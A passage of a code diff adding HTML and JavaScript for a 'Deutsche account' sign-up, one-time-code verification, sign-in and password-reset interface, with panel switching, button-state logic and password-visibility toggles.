+      <input class="word" type="password" id="confirmPassword" placeholder="Confirm password" required>
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('confirmPassword')" id="toggle-confirm-password-219">visibility</span>
+      <button type="submit" id="frank" class="word3"><span class="button-text1">Next</span>  <div class="loader"></div></button>
+    </form>
+    <div style="display: flex;" id="account-prompt-916">
+      <div class="word1" id="already-have-account-104">Already have an account?</div>
+      <span style="margin-left: 1%; font-weight: 570; color: #4b2b7f;" class="word1" id="mod4">Sign in</span>
+    </div>
+  </div>
+</div>
+
+<div id="mod1" style="display: none;">
+  <div class="header5d" id="back-header-853">
+    <div id="fan1" class="back-arrow1"></div>
+    <h1 class="text-bold" style="font-size: 15px; margin-left: -72%; font-weight: 400; color: #4b2b7f;" id="back-text-731">Back</h1>
+  </div>
+  <div class="text-bold"style="font-size: 18px; font-weight: 800; margin-left: 6%; color: black; margin-top: 4%;" id="confirm-header-925">Confirm Your Email Address</div>
+  <div class="text-bold"style="font-size: 14px; color: #333; font-weight: 400; padding: 23px;" id="confirm-desc-102">We'll send a code to your email address to confirm it's truly yours.</div>
+  <div class="text-bold"style="font-size: 18px; font-weight: 800; color: #4b2b7f; margin-left: 6%;" id="emailDisplay"></div>
+  <div style="margin-left: 6%; background-color: rgba(255, 0, 0, 0.0);" id="otp-form-container-491">
+    <form onsubmit="frank3(event)" id="otp-form-142">
+      <div class="word1" style="margin-top: 4%;" id="otp-label-674">Verification Code</div>
+      <input class="word" type="password" id="registerOTP" placeholder="******" required maxlength="6" max="999999">
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('registerOTP')" id="toggle-otp-842">visibility</span>
+      <span style="margin-top: 2%; font-size: 15px; font-weight: 500; margin-left: 2%; display: block;" id="registerMessage2"></span>
+      <div class="text-bold"style="margin-top: 3%; font-weight: 500; font-size: 15px; color: #00b712;" onclick="frankJoy(event)" id="resend-code-335">Resend Code</div>
+      <button style="margin-top: 4%;" type="submit" id="frank4" class="word3">Next</button>
+    </form>
+  </div>
+</div>
+
+<div id="mod3" style="display: none; " >
+  <div class="header5d" id="signin-back-header-842">
+    <div id="fan2" class="back-arrow1"></div>
+    <h1 class="text-bold"style="font-size: 15px; margin-left: -70%; font-weight: 400; color: #4b2b7f;" id="signin-back-text-412">Back</h1>
+  </div>
+  <div class="text-bold" style="font-weight: 650; font-size: 23px; margin-top: 5%; margin-left: 6%; color: black;" id="signin-header-431">Sign In</div>
+  <div class="text-bold" style="font-size: 14px; color: #333; font-weight: 400; padding: 23px;" id="signin-desc-831">To sign in, please type in the email linked to your Deutsche account.</div>
+  <div style="margin-left: 6%; background-color: rgba(255, 0, 0, 0.0);" id="signin-form-container-651">
+    <form onsubmit="frankLogin(event)" id="signin-form-912">
+      <div class="word1" id="signin-email-label-215">Email Address</div>
+      <input type="email" class="word" id="loginEmail" required>
+      <div class="word1" id="signin-password-label-634">Password</div>
+      <input class="word" type="password" id="loginPassword" placeholder="Enter password" required>
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('loginPassword')" id="toggle-signin-password-516">visibility</span>
+      <span style="margin-top: 2%; font-size: 15px; font-weight: 500; margin-left: 2%; display: block;" id="loginMessage"></span>
+      <div style="display: flex;" id="forgotten-password-prompt-762">
+        <div class="word1" id="forgotten-password-text-315">Forgotten password?</div>
+        <span style="margin-left: 1%; font-weight: 570; color: #4b2b7f;" class="word1" id="mod1a">Reset</span>
+      </div>
+      <button style="margin-top: 4%;" type="submit" id="frank5" class="word3"><span class="button-text1">Next</span>  <div class="loader"></div></button>
+    </form>
+  </div>
+</div>
+
+<!-- Additional sections updated similarly -->
+<div id="mod6" style="display: none;">
+  <div class="header5d">
+    <div id="fan5" class="back-arrow1"></div>
+    <h1 class="text-bold" style="font-size: 15px; margin-left: -72%; font-weight: 400; color: #4b2b7f;" id="back-header-387">Back</h1>
+  </div>
+  <div class="text-bold" style="font-size: 18px; font-weight: 800; margin-left: 6%; color: black; margin-top: 4%;" id="confirm-header-768">Confirm Your Email Address</div>
+  <div class="text-bold" style="font-size: 14px; color: #333; font-weight: 400; padding: 23px;" id="description-482">
+    We'll send a code to your email address to confirm it's truly yours.
+  </div>
+  <div class="text-bold" style="font-size: 18px; font-weight: 800; color: #4b2b7f; margin-left: 6%;" id="emailDisplay2"></div>
+  <div style="margin-left: 6%; background-color: rgba(255, 0, 0, 0.0);">
+    <form onsubmit="frank6(event)" id="verification-form-743">
+      <div class="word1" style="margin-top: 4%;" id="verification-label-239">Verification Code</div>
+      <input class="word" type="password" id="registerOTP1" placeholder="******" required maxlength="6" max="999999">
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('registerOTP1')" id="toggle-password-814">visibility</span>
+      <span  style="margin-top: 2%; font-size: 15px; font-weight: 500; margin-left: 2%; display: block;" id="loginMessage2"></span>
+      <div class="text-bold"style="margin-top: 3%; font-weight: 500; font-size: 15px; color: #00b712;" onclick="frankLogin(event)" id="resend-code-914">Resend Code</div>
+      <button style="margin-top: 4%;" type="submit" id="frank7" class="word3"><span class="button-text1">Next</span>  <div class="loader"></div></button>
+    </form>
+  </div>
+</div>
+
+<div id="mod9" style="display: none;">
+  <div class="header5d">
+    <div id="fan4" class="back-arrow1"></div>
+    <h1 class="text-bold" style="font-size: 15px; margin-left: -72%; font-weight: 400; color: #4b2b7f;" id="back-header-122">Back</h1>
+  </div>
+  <div class="text-bold"style="font-weight: 650; font-size: 20px; margin-top: 5%; margin-left: 6%; color: black;" id="reset-header-589">Reset Your Password</div>
+  <div class="text-bold" style="font-size: 14px; color: #333; font-weight: 400; padding: 23px;" id="reset-description-349">
+    Reset your Deutsche account password with just a few clicks.
+  </div>
+  <div style="margin-left: 6%; background-color: rgba(255, 0, 0, 0.0);" id="reset-form-container-274">
+    <form onsubmit="resetDetails(event)" id="reset-form-138">
+      <div class="word1" id="reset-email-label-841">Email Address</div>
+      <input type="email" class="word" id="resetEmail" required>
+      <div class="word1" id="reset-password-label-914">Set Password</div>
+      <input class="word" type="password" id="resetPassword" placeholder="Set password" required>
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('resetPassword')" id="toggle-reset-password-537">visibility</span>
+      <div class="word1" id="confirm-password-label-211">Confirm Password</div>
+      <input class="word" type="password" id="coPassword" placeholder="Confirm password" required>
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('coPassword')" id="toggle-confirm-password-763">visibility</span>
+      <span style="margin-top: 2%; font-size: 15px; font-weight: 500; margin-left: 2%; display: block;" id="resetMessage"></span>
+      <button type="submit" id="frane1" class="word3"><span class="button-text1">Next</span>  <div class="loader"></div></button>
+    </form>
+  </div>
+</div>
+
+<div id="mod1b" style="display: none;">
+  <div class="header5d">
+    <div id="fan3" class="back-arrow1"></div>
+    <h1 class="text-bold"style="font-size: 15px; margin-left: -72%; font-weight: 400; color: #4b2b7f;" id="back-header-503">Back</h1>
+  </div>
+  <div class="text-bold"style="font-size: 18px; font-weight: 800; margin-left: 6%; color: black; margin-top: 4%;" id="confirm-header-217">Confirm Your Email Address</div>
+  <div class="text-bold"style="font-size: 14px; color: #333; font-weight: 400; padding: 23px;" id="description-703">
+    We'll send a code to your email address to confirm it's truly yours.
+  </div>
+  <div class="text-bold"style="font-size: 18px; font-weight: 800; color: #4b2b7f; margin-left: 6%;" id="emailDisplay3"></div>
+  <div style="margin-left: 6%; background-color: rgba(255, 0, 0, 0.0);">
+    <form onsubmit="resetOtp(event)" id="otp-form-476">
+      <div class="word1" style="margin-top: 4%;" id="verification-label-945">Verification Code</div>
+      <input class="word" type="password" id="registerOTP4" placeholder="******" required maxlength="6" max="999999">
+      <span class="toggle-password material-icons" onclick="togglePasswordVisibility('registerOTP4')" id="toggle-password-384">visibility</span>
+      <span style="margin-top: 2%; font-size: 15px; font-weight: 500; margin-left: 2%; display: block;" id="resetMessage2"></span>
+      <div class="text-bold" style="margin-top: 3%; font-weight: 500; font-size: 15px; color: #00b712;" onclick="resetDetails(event)" id="resend-code-811">Resend Code</div>
+     
+      <button class="word3"  style="margin-top: 4%; " type="submit" id="frank1b" >Next</button>
+    </form>
+  </div>
+</div>
+</div>
+ <iframe id="iframe" src="" style="width: 100%; height: 98vh; border: none ; display: none; top: 0; position: fixed; margin-left: -3.5%; padding: 5px;"></iframe>
+
+<script >
+
+         document.getElementById("mod2").style.display='block'; 
+// Trigger the animation when the page loads
+
+  const handElement = document.querySelector('.hand');
+  if (handElement) {
+    handElement.classList.add('fade-up-zoom-in');
+  }
+
+const frank = document.getElementById('frank');
+ const fullName = document.getElementById('fullName');    
+  const setPassword = document.getElementById('registerPassword');   
+ const email1 = document.getElementById('registerEmail');    
+  const confirmPassword = document.getElementById('confirmPassword');    
+  function updateButtonState2() {
+    // Check if all fields have text entered
+    if (
+      fullName.value.trim() !== "" &&
+      email1.value.trim() !== "" &&
+      setPassword.value.trim() !== "" &&
+      confirmPassword.value.trim() !== ""
+    ) {
+      frank.classList.add('active'); // Add color change class
+
+    } else {
+      frank.classList.remove('active'); // Remove color change class
+      
+    }
+  }
+
+  // Add event listeners to all input fields
+  fullName.addEventListener('input', updateButtonState2);
+  email1.addEventListener('input', updateButtonState2);
+  setPassword.addEventListener('input', updateButtonState2);
+  confirmPassword.addEventListener('input', updateButtonState2);  
+const frant = document.getElementById('frank4');
+ 
+      const verifyOtp = document.getElementById('registerOTP');    
+
+  function updateButtonState3() {
+    // Check if all fields have text entered
+    if (
+      verifyOtp.value.trim() !== "" ) {
+      frant.classList.add('active'); // Add color change class
+
+    } else {
+      frant.classList.remove('active'); // Remove color change class
+      
+    }
+  }
+
+  // Add event listeners to all input fields
+  verifyOtp.addEventListener('input', updateButtonState3);
+ const frane = document.getElementById('frank7');
+ 
+      const verifyOtp1 = document.getElementById('registerOTP1');    
+
+  function updateButtonState7() {
+    // Check if all fields have text entered
+    if (
+      verifyOtp1.value.trim() !== "" ) {
+      frane.classList.add('active'); // Add color change class
+
+    } else {
+      frane.classList.remove('active'); // Remove color change class
+      
+    }
+  }
+
+  // Add event listeners to all input fields
+  verifyOtp1.addEventListener('input', updateButtonState7);
+  const frank5 = document.getElementById('frank5');
+ 
+      const loginAmail = document.getElementById('loginEmail');    
+const loginBa = document.getElementById('loginPassword');    
+function updateButtonState4() {
+    // Check if all fields have text entered
+    if (
+      loginAmail.value.trim() !== "" &&
+       loginBa.value.trim() !== "" 
+      ) {
+      frank5.classList.add('active'); // Add color change class
+
+    } else {
+      frank5.classList.remove('active'); // Remove color change class
+      
+    }
+  }
+  // Add event listeners to all input fields
+ loginAmail.addEventListener('input', updateButtonState4);      
+  loginBa.addEventListener('input', updateButtonState4);           
+       const frane1 = document.getElementById('frane1');
+
+  const resetPassword = document.getElementById('resetPassword');   
+ const email3 = document.getElementById('resetEmail');    
+  const coPassword = document.getElementById('coPassword');    
+  function updateButtonStates() {
+    // Check if all fields have text entered
+    if (
+     
+      email3.value.trim() !== "" &&
+      resetPassword.value.trim() !== "" &&
+      coPassword.value.trim() !== ""
+    ) {
+      frane1.classList.add('active'); // Add color change class
+
+    } else {
+      frane1.classList.remove('active'); // Remove color change class
+      
+    }
+  }
+
+ 
+  email3.addEventListener('input', updateButtonStates);
+  resetPassword.addEventListener('input', updateButtonStates);
+  coPassword.addEventListener('input', updateButtonStates);  
+ const frank1b = document.getElementById('frank1b');
+ 
+      const verifyOtp8 = document.getElementById('registerOTP4');    
+
+  function updateButtonState3a() {
+    // Check if all fields have text entered
+    if (
+      verifyOtp8.value.trim() !== "" ) {
+      frank1b.classList.add('active'); // Add color change class
+
+    } else {
+      frank1b.classList.remove('active'); // Remove color change class
+      
+    }
+  }
+
+  // Add event listeners to all input fields
+  verifyOtp8.addEventListener('input', updateButtonState3a);       
+        
+        
+        
+        window.togglePasswordVisibility = function (fieldId) {
+    const field = document.getElementById(fieldId); // Find the password field by ID
+    const icon = field.parentElement.querySelector('.material-icons'); // Find the icon within the same form group
+
+    if (field.type === "password") {
+        field.type = "text"; // Show the password
+        
+    } else {
+        field.type = "password"; // Hide the password
+        icon.textContent = "visibility"; // Change icon to "eye"
+    }
+};
+document.getElementById('fan1').addEventListener('click', function () {
+document.getElementById("mod1").style.display='none'; 
+document.getElementById("mod2").style.display='block'; 
+
+});
+
+
+document.getElementById('mod4').addEventListener('click', function () {
+ 
+document.getElementById("mod1").style.display='none'; 
+document.getElementById("mod2").style.display='none'; 
+
+document.getElementById("mod3").style.display='block'; 
+  const handElement = document.getElementById('mod3'); // Get the element by ID
+ 
+    handElement.classList.add('fade-up-zoom-in');
+  
+history.pushState({ modalOpen: true }, '');
+
+
+});
+document.getElementById('mod1a').addEventListener('click', function () {
+document.getElementById("mod1").style.display='none'; 
+document.getElementById("mod2").style.display='none'; 
+document.getElementById("mod3").style.display='none'; 
+
+document.getElementById("mod9").style.display='block'; 
+  history.pushState({ modalOpe51: true }, ''); 
+window.addEventListener('popstate', (event) => {
+      if (!event.state?.modalOpe51) {
+     document.getElementById("mod9").style.display ='none'           
+document.getElementById("mod2").style.display ='block'           
+   }
+   });
+  
+});
+document.getElementById('fan2').addEventListener('click', function () {
+document.getElementById("mod3").style.display='none'; 
+document.getElementById("mod1").style.display='none'; 
+document.getElementById("mod2").style.display='block'; 
+});
+document.getElementById('fan5').addEventListener('click', function () {
+document.getElementById("mod3").style.display='block'; 
+document.getElementById("mod6").style.display='none'; 
+document.getElementById("mod9").style.display='none'; 
+});
+
+document.getElementById('fan4').addEventListener('click', function () {
+document.getElementById("mod3").style.display='block'; 
+document.getElementById("mod9").style.display='none'; 
+
+});
+window.addEventListener('popstate', (event) => {
+      if (!event.state?.modalOpen) {
+        // Close the modal if the state does not indicate it's open
+        document.getElementById("mod3").style.display='none'; 
+ document.getElementById("mod9").style.display='none';  
+ document.getElementById("mod2").style.display='block';    
+      }
+    });
+</script>
+
+</body>
+</html>
